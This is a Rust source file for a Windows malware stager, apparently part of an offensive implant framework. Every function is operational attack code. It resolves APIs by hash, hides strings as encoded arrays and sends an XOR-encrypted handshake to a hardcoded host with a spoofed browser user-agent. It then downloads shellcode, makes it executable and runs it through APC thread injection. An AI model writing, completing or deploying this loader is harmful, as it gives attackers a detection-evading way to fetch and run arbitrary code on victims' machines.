use crate::constants::{
    AF_INET, END_OFFSET, IPPROTO_TCP, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ,
    PAGE_READWRITE, SOCK_STREAM, STATUS_SUCCESS, THREAD_CREATE_FLAGS_CREATE_SUSPENDED,
};
use crate::hash_str;
use crate::resolve;
use crate::windows::*;
use core::ffi::c_void;

// kernel32 function pointer types
type FnLoadLibraryA = unsafe extern "system" fn(lpLibFileName: PSTR) -> HMODULE;
type FnGetProcAddress = unsafe extern "system" fn(hModule: HMODULE, lpProcName: PSTR) -> PVOID;

// ws2_32 function pointer types
type FnWSAStartup = unsafe extern "system" fn(wVersionRequested: WORD, lpWSAData: *mut WSADATA) -> i32;
type FnSocket = unsafe extern "system" fn(af: i32, socket_type: i32, protocol: i32) -> usize;
type FnConnect = unsafe extern "system" fn(s: usize, name: *const SOCKADDR_IN, namelen: i32) -> i32;
type FnSend = unsafe extern "system" fn(s: usize, buf: *const u8, len: i32, flags: i32) -> i32;
type FnRecv = unsafe extern "system" fn(s: usize, buf: *mut u8, len: i32, flags: i32) -> i32;
type FnClosesocket = unsafe extern "system" fn(s: usize) -> i32;
type FnInetAddr = unsafe extern "system" fn(cp: *const u8) -> u32;
type FnHtons = unsafe extern "system" fn(hostshort: u16) -> u16;

// winhttp.dll function pointer types
type FnWinHttpOpen = unsafe extern "system" fn(
    pszAgentW: LPCWSTR, dwAccessType: DWORD, pszProxyW: LPCWSTR,
    pszProxyBypassW: LPCWSTR, dwFlags: DWORD,
) -> HANDLE;
type FnWinHttpConnect = unsafe extern "system" fn(
    hSession: HANDLE, pswzServerName: LPCWSTR, nServerPort: WORD, dwReserved: DWORD,
) -> HANDLE;
type FnWinHttpOpenRequest = unsafe extern "system" fn(
    hConnect: HANDLE, pwszVerb: LPCWSTR, pwszObjectName: LPCWSTR,
    pwszVersion: LPCWSTR, pwszReferrer: LPCWSTR, ppwszAcceptTypes: *const LPCWSTR,
    dwFlags: DWORD,
) -> HANDLE;
type FnWinHttpSendRequest = unsafe extern "system" fn(
    hRequest: HANDLE, lpszHeaders: LPCWSTR, dwHeadersLength: DWORD,
    lpOptional: PVOID, dwOptionalLength: DWORD,
    dwTotalLength: DWORD, dwContext: usize,
) -> BOOL;
type FnWinHttpReceiveResponse = unsafe extern "system" fn(
    hRequest: HANDLE, lpReserved: PVOID,
) -> BOOL;
type FnWinHttpReadData = unsafe extern "system" fn(
    hRequest: HANDLE, lpBuffer: PVOID, dwNumberOfBytesToRead: DWORD,
    lpdwNumberOfBytesRead: *mut DWORD,
) -> BOOL;
type FnWinHttpCloseHandle = unsafe extern "system" fn(hInternet: HANDLE) -> BOOL;
type FnWinHttpSetOption = unsafe extern "system" fn(
    hInternet: HANDLE, dwOption: DWORD, lpBuffer: PVOID, dwBufferLength: DWORD,
) -> BOOL;

// wininet.dll function pointer types
type FnInternetOpenA = unsafe extern "system" fn(
    lpszAgent: PSTR, dwAccessType: DWORD, lpszProxy: PSTR,
    lpszProxyBypass: PSTR, dwFlags: DWORD,
) -> HANDLE;
type FnInternetConnectA = unsafe extern "system" fn(
    hInternet: HANDLE, lpszServerName: PSTR, nServerPort: WORD,
    lpszUserName: PSTR, lpszPassword: PSTR,
    dwService: DWORD, dwFlags: DWORD, dwContext: usize,
) -> HANDLE;
type FnHttpOpenRequestA = unsafe extern "system" fn(
    hConnect: HANDLE, lpszVerb: PSTR, lpszObjectName: PSTR,
    lpszVersion: PSTR, lpszReferrer: PSTR, lplpszAcceptTypes: *const PSTR,
    dwFlags: DWORD, dwContext: usize,
) -> HANDLE;
type FnHttpSendRequestA = unsafe extern "system" fn(
    hRequest: HANDLE, lpszHeaders: PSTR, dwHeadersLength: DWORD,
    lpOptional: PVOID, dwOptionalLength: DWORD,
) -> BOOL;
type FnInternetReadFile = unsafe extern "system" fn(
    hFile: HANDLE, lpBuffer: PVOID, dwNumberOfBytesToRead: DWORD,
    lpdwNumberOfBytesRead: *mut DWORD,
) -> BOOL;
type FnInternetCloseHandle = unsafe extern "system" fn(hInternet: HANDLE) -> BOOL;
type FnInternetSetOptionA = unsafe extern "system" fn(
    hInternet: HANDLE, dwOption: DWORD, lpBuffer: PVOID, dwBufferLength: DWORD,
) -> BOOL;

// ntdll NtAPI function pointer types
type FnNtAllocateVirtualMemory = unsafe extern "system" fn(
    ProcessHandle: HANDLE,
    BaseAddress: *mut PVOID,
    ZeroBits: ULONG_PTR,
    RegionSize: PSIZE_T,
    AllocationType: ULONG,
    Protect: ULONG,
) -> NTSTATUS;
type FnNtProtectVirtualMemory = unsafe extern "system" fn(
    ProcessHandle: HANDLE,
    BaseAddress: *mut PVOID,
    RegionSize: PSIZE_T,
    NewProtect: ULONG,
    OldProtect: *mut ULONG,
) -> NTSTATUS;
type FnNtCreateThreadEx = unsafe extern "system" fn(
    ThreadHandle: *mut HANDLE,
    DesiredAccess: ACCESS_MASK,
    ObjectAttributes: *mut OBJECT_ATTRIBUTES,
    ProcessHandle: HANDLE,
    StartRoutine: PVOID,
    Argument: PVOID,
    CreateFlags: ULONG,
    ZeroBits: SIZE_T,
    StackSize: SIZE_T,
    MaximumStackSize: SIZE_T,
    AttributeList: PVOID,
) -> NTSTATUS;
type FnNtQueueApcThread = unsafe extern "system" fn(
    ThreadHandle: HANDLE,
    ApcRoutine: PVOID,
    ApcArgument1: PVOID,
    ApcArgument2: PVOID,
    ApcArgument3: PVOID,
) -> NTSTATUS;
type FnNtAlertResumeThread = unsafe extern "system" fn(
    ThreadHandle: HANDLE,
    PreviousSuspendCount: *mut ULONG,
) -> NTSTATUS;
type FnNtWaitForSingleObject = unsafe extern "system" fn(
    Handle: HANDLE,
    Alertable: BOOL,
    Timeout: *mut i64,
) -> NTSTATUS;

pub struct Instance {
    pub base: BaseInfo,
    pub ntdll: NtdllModule,
    pub kernel32: Kernel32Module,
}

pub struct BaseInfo {
    pub address: usize,
    pub length: usize,
}

pub struct NtdllModule {
    pub handle: usize,
    pub NtAllocateVirtualMemory: *mut FnNtAllocateVirtualMemory,
    pub NtProtectVirtualMemory: *mut FnNtProtectVirtualMemory,
    pub NtCreateThreadEx: *mut FnNtCreateThreadEx,
    pub NtQueueApcThread: *mut FnNtQueueApcThread,
    pub NtAlertResumeThread: *mut FnNtAlertResumeThread,
    pub NtWaitForSingleObject: *mut FnNtWaitForSingleObject,
}

pub struct Kernel32Module {
    pub handle: usize,
    pub LoadLibraryA: *mut FnLoadLibraryA,
    pub GetProcAddress: *mut FnGetProcAddress,
}

impl Instance {
    pub fn new() -> Self {
        unsafe {
            let mut instance = Instance {
                base: BaseInfo {
                    address: 0,
                    length: 0,
                },
                ntdll: NtdllModule {
                    handle: 0,
                    NtAllocateVirtualMemory: core::ptr::null_mut(),
                    NtProtectVirtualMemory: core::ptr::null_mut(),
                    NtCreateThreadEx: core::ptr::null_mut(),
                    NtQueueApcThread: core::ptr::null_mut(),
                    NtAlertResumeThread: core::ptr::null_mut(),
                    NtWaitForSingleObject: core::ptr::null_mut(),
                },
                kernel32: Kernel32Module {
                    handle: 0,
                    LoadLibraryA: core::ptr::null_mut(),
                    GetProcAddress: core::ptr::null_mut(),
                },
            };

            instance.base.address = crate::RipStart();
            instance.base.length =
                (crate::RipData() - instance.base.address) + END_OFFSET;

            instance.ntdll.handle = resolve::module(hash_str!("ntdll.dll"));
            if instance.ntdll.handle == 0 {
                return instance;
            }

            instance.kernel32.handle = resolve::module(hash_str!("kernel32.dll"));
            if instance.kernel32.handle == 0 {
                return instance;
            }

            // Resolve kernel32 APIs
            instance.kernel32.LoadLibraryA = core::mem::transmute(
                resolve::_api(instance.kernel32.handle, hash_str!("LoadLibraryA") as usize),
            );
            instance.kernel32.GetProcAddress = core::mem::transmute(
                resolve::_api(instance.kernel32.handle, hash_str!("GetProcAddress") as usize),
            );

            // Resolve ntdll APIs
            instance.ntdll.NtAllocateVirtualMemory = core::mem::transmute(
                resolve::_api(instance.ntdll.handle, hash_str!("NtAllocateVirtualMemory") as usize),
            );
            instance.ntdll.NtProtectVirtualMemory = core::mem::transmute(
                resolve::_api(instance.ntdll.handle, hash_str!("NtProtectVirtualMemory") as usize),
            );
            instance.ntdll.NtCreateThreadEx = core::mem::transmute(
                resolve::_api(instance.ntdll.handle, hash_str!("NtCreateThreadEx") as usize),
            );
            instance.ntdll.NtQueueApcThread = core::mem::transmute(
                resolve::_api(instance.ntdll.handle, hash_str!("NtQueueApcThread") as usize),
            );
            instance.ntdll.NtAlertResumeThread = core::mem::transmute(
                resolve::_api(instance.ntdll.handle, hash_str!("NtAlertResumeThread") as usize),
            );
            instance.ntdll.NtWaitForSingleObject = core::mem::transmute(
                resolve::_api(instance.ntdll.handle, hash_str!("NtWaitForSingleObject") as usize),
            );

            instance
        }
    }

    // INSTANCE_START_MARKER - malefic-mutant appends start() and closes impl below

    pub unsafe fn start(&self, _args: *mut c_void) {
        fn xor_process(data: &mut [u8], key: &[u8], iv: &[u8], counter: &mut usize) {
            for byte in data.iter_mut() {
                *byte ^= key[*counter % key.len()] ^ iv[*counter % iv.len()];
                *counter += 1;
            }
        }

        // Load winhttp.dll
        let dll_name: [u8; 12] = [b'w', b'i', b'n', b'h', b't', b't', b'p', b'.', b'd', b'l', b'l', 0];
        let load_lib: FnLoadLibraryA = core::mem::transmute(self.kernel32.LoadLibraryA);
        let h_dll = load_lib(dll_name.as_ptr() as *mut u8);
        if h_dll.is_null() { return; }
        let dll_base = h_dll as usize;

        // Resolve WinHTTP APIs via hash
        let p_winhttp_open: FnWinHttpOpen = core::mem::transmute(
            resolve::_api(dll_base, hash_str!("WinHttpOpen") as usize));
        let p_winhttp_connect: FnWinHttpConnect = core::mem::transmute(
            resolve::_api(dll_base, hash_str!("WinHttpConnect") as usize));
        let p_winhttp_open_request: FnWinHttpOpenRequest = core::mem::transmute(
            resolve::_api(dll_base, hash_str!("WinHttpOpenRequest") as usize));
        let p_winhttp_send_request: FnWinHttpSendRequest = core::mem::transmute(
            resolve::_api(dll_base, hash_str!("WinHttpSendRequest") as usize));
        let p_winhttp_receive_response: FnWinHttpReceiveResponse = core::mem::transmute(
            resolve::_api(dll_base, hash_str!("WinHttpReceiveResponse") as usize));
        let p_winhttp_read_data: FnWinHttpReadData = core::mem::transmute(
            resolve::_api(dll_base, hash_str!("WinHttpReadData") as usize));
        let p_winhttp_close_handle: FnWinHttpCloseHandle = core::mem::transmute(
            resolve::_api(dll_base, hash_str!("WinHttpCloseHandle") as usize));
        let p_winhttp_set_option: FnWinHttpSetOption = core::mem::transmute(
            resolve::_api(dll_base, hash_str!("WinHttpSetOption") as usize));

        // WinHttpOpen(userAgent, WINHTTP_ACCESS_TYPE_NO_PROXY=1, null, null, 0)
        let h_session = p_winhttp_open(
            core::ptr::null(),
            1u32,
            core::ptr::null(),
            core::ptr::null(),
            0u32,
        );
        if h_session.is_null() { return; }

        // WinHttpConnect(hSession, server, port, 0)
        let server: [u16; 16] = [0x0031, 0x0039, 0x0032, 0x002e, 0x0031, 0x0036, 0x0038, 0x002e, 0x0032, 0x0033, 0x0039, 0x002e, 0x0031, 0x0036, 0x0031, 0x0000];
        let h_connect = p_winhttp_connect(
            h_session,
            server.as_ptr(),
            8080u16,
            0u32,
        );
        if h_connect.is_null() {
            p_winhttp_close_handle(h_session);
            return;
        }

        // WinHttpOpenRequest(hConnect, method, path, null, null, null, flags)
        let method: [u16; 5] = [0x0050, 0x004f, 0x0053, 0x0054, 0x0000];
        let path: [u16; 7] = [0x002f, 0x0070, 0x0075, 0x006c, 0x0073, 0x0065, 0x0000];
        let flags: DWORD = 0u32;
        let h_request = p_winhttp_open_request(
            h_connect,
            method.as_ptr(),
            path.as_ptr(),
            core::ptr::null(),
            core::ptr::null(),
            core::ptr::null(),
            flags,
        );
        if h_request.is_null() {
            p_winhttp_close_handle(h_connect);
            p_winhttp_close_handle(h_session);
            return;
        }

        

        // Configuration
        let key: [u8; 16] = [0x6d, 0x61, 0x6c, 0x69, 0x63, 0x65, 0x6f, 0x66, 0x69, 0x6e, 0x74, 0x65, 0x72, 0x6e, 0x61, 0x6c];
        let iv: [u8; 16] = [0x6c, 0x61, 0x6e, 0x72, 0x65, 0x74, 0x6e, 0x69, 0x66, 0x6f, 0x65, 0x63, 0x69, 0x6c, 0x61, 0x6d];

        // Build handshake body: [start][magic:4][artifact_id:4][end]
        let mut body: [u8; 10] = [0; 10];
        body[0] = 65u8;
        let m = 0x03e3d026u32.to_le_bytes();
        body[1] = m[0]; body[2] = m[1]; body[3] = m[2]; body[4] = m[3];
        let a = 3u32.to_le_bytes();
        body[5] = a[0]; body[6] = a[1]; body[7] = a[2]; body[8] = a[3];
        body[9] = 66u8;

        // Encrypt body
        let mut counter: usize = 0;
        xor_process(&mut body, &key, &iv, &mut counter);

        // WinHttpSendRequest(hRequest, headers, headersLen, body, bodyLen, totalLen, context)
        let req_headers: [u16; 87] = [0x0055, 0x0073, 0x0065, 0x0072, 0x002d, 0x0041, 0x0067, 0x0065, 0x006e, 0x0074, 0x003a, 0x0020, 0x004d, 0x006f, 0x007a, 0x0069, 0x006c, 0x006c, 0x0061, 0x002f, 0x0035, 0x002e, 0x0030, 0x0020, 0x0028, 0x0057, 0x0069, 0x006e, 0x0064, 0x006f, 0x0077, 0x0073, 0x0020, 0x004e, 0x0054, 0x0020, 0x0036, 0x002e, 0x0031, 0x003b, 0x0020, 0x0057, 0x004f, 0x0057, 0x0036, 0x0034, 0x003b, 0x0020, 0x0072, 0x0076, 0x003a, 0x0034, 0x0030, 0x002e, 0x0030, 0x0029, 0x0020, 0x0047, 0x0065, 0x0063, 0x006b, 0x006f, 0x002f, 0x0032, 0x0030, 0x0031, 0x0030, 0x0030, 0x0031, 0x0030, 0x0031, 0x0020, 0x0046, 0x0069, 0x0072, 0x0065, 0x0066, 0x006f, 0x0078, 0x002f, 0x0034, 0x0030, 0x002e, 0x0030, 0x000d, 0x000a, 0x0000];
        let ret = p_winhttp_send_request(
            h_request,
            req_headers.as_ptr(),
            86u32,
            body.as_ptr() as PVOID,
            10u32,
            10u32,
            0usize,
        );
        if ret == 0 {
            p_winhttp_close_handle(h_request);
            p_winhttp_close_handle(h_connect);
            p_winhttp_close_handle(h_session);
            return;
        }

        // WinHttpReceiveResponse
        let ret = p_winhttp_receive_response(h_request, core::ptr::null_mut());
        if ret == 0 {
            p_winhttp_close_handle(h_request);
            p_winhttp_close_handle(h_connect);
            p_winhttp_close_handle(h_session);
            return;
        }

        // Read response body: first 9 bytes header
        let mut resp: [u8; 9] = [0; 9];
        let mut offset = 0u32;
        while offset < 9 {
            let mut bytes_read: DWORD = 0;
            let ret = p_winhttp_read_data(
                h_request,
                resp.as_mut_ptr().add(offset as usize) as PVOID,
                9 - offset,
                &mut bytes_read,
            );
            if ret == 0 || bytes_read == 0 {
                p_winhttp_close_handle(h_request);
                p_winhttp_close_handle(h_connect);
                p_winhttp_close_handle(h_session);
                return;
            }
            offset += bytes_read;
        }

        // Decrypt and validate response
        counter = 0;
        xor_process(&mut resp, &key, &iv, &mut counter);
        if resp[0] != 65u8 {
            p_winhttp_close_handle(h_request);
            p_winhttp_close_handle(h_connect);
            p_winhttp_close_handle(h_session);
            return;
        }
        let recv_magic = u32::from_le_bytes([resp[1], resp[2], resp[3], resp[4]]);
        let recv_len = u32::from_le_bytes([resp[5], resp[6], resp[7], resp[8]]);
        if recv_magic != 0x03e3d026u32 || recv_len == 0 {
            p_winhttp_close_handle(h_request);
            p_winhttp_close_handle(h_connect);
            p_winhttp_close_handle(h_session);
            return;
        }

        // Allocate memory for shellcode
        let mut base_addr: PVOID = core::ptr::null_mut();
        let mut region_size: SIZE_T = recv_len as usize + 1;
        let nt_alloc: FnNtAllocateVirtualMemory =
            core::mem::transmute(self.ntdll.NtAllocateVirtualMemory);
        let status = nt_alloc(
            -1isize as HANDLE, &mut base_addr, 0, &mut region_size,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE,
        );
        if status != STATUS_SUCCESS || base_addr.is_null() {
            p_winhttp_close_handle(h_request);
            p_winhttp_close_handle(h_connect);
            p_winhttp_close_handle(h_session);
            return;
        }

        // Read shellcode via WinHttpReadData
        let mut total_read: u32 = 0;
        while total_read < recv_len {
            let mut bytes_read: DWORD = 0;
            let ret = p_winhttp_read_data(
                h_request,
                (base_addr as *mut u8).add(total_read as usize) as PVOID,
                recv_len - total_read,
                &mut bytes_read,
            );
            if ret == 0 || bytes_read == 0 {
                p_winhttp_close_handle(h_request);
                p_winhttp_close_handle(h_connect);
                p_winhttp_close_handle(h_session);
                return;
            }
            total_read += bytes_read;
        }
        p_winhttp_close_handle(h_request);
        p_winhttp_close_handle(h_connect);
        p_winhttp_close_handle(h_session);

        // Decrypt shellcode
        xor_process(
            core::slice::from_raw_parts_mut(base_addr as *mut u8, recv_len as usize),
            &key, &iv, &mut counter,
        );

        // Change memory protection to executable
        let mut old_protect: ULONG = 0;
        let mut protect_base = base_addr;
        let mut protect_size = region_size;
        let nt_protect: FnNtProtectVirtualMemory =
            core::mem::transmute(self.ntdll.NtProtectVirtualMemory);
        nt_protect(
            -1isize as HANDLE, &mut protect_base, &mut protect_size,
            PAGE_EXECUTE_READ, &mut old_protect,
        );

        // Execute shellcode via APC injection
        let nt_create: FnNtCreateThreadEx =
            core::mem::transmute(self.ntdll.NtCreateThreadEx);
        let nt_queue: FnNtQueueApcThread =
            core::mem::transmute(self.ntdll.NtQueueApcThread);
        let nt_resume: FnNtAlertResumeThread =
            core::mem::transmute(self.ntdll.NtAlertResumeThread);
        let nt_wait: FnNtWaitForSingleObject =
            core::mem::transmute(self.ntdll.NtWaitForSingleObject);

        let mut thread_handle: HANDLE = core::ptr::null_mut();
        nt_create(
            &mut thread_handle, 0x1FFFFF, core::ptr::null_mut(),
            -1isize as HANDLE, base_addr, core::ptr::null_mut(),
            THREAD_CREATE_FLAGS_CREATE_SUSPENDED,
            0, 0, 0, core::ptr::null_mut(),
        );
        if thread_handle.is_null() { return; }

        nt_queue(
            thread_handle, base_addr,
            core::ptr::null_mut(), core::ptr::null_mut(), core::ptr::null_mut(),
        );

        let mut suspend_count: ULONG = 0;
        nt_resume(thread_handle, &mut suspend_count);
        nt_wait(thread_handle, 0, core::ptr::null_mut());
    }
}
